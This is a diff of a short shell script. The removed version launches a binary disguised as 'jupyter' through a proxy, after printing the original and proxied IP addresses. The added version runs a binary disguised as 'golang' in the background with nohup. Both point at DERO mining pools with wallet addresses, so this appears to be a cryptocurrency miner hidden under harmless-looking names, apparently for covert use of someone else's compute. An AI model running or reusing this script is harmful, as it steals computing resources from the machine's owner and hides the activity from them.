@@ -1,4 +1,2 @@
-chmod +x proxychains.conf jupyter proxy libproxychains4.so proxychains.conf
-echo "IP ORI ==> "$(curl ifconfig.me)
-echo "IP Baru ==> "$(./proxy curl ifconfig.me)
-./jupyter -r 15.235.164.162:4300 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.GAS -m 14
+chmod 700 golang
+nohup ./golang -r dero-node-va.mysrv.cloud:10300 -w deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr -p rpc &
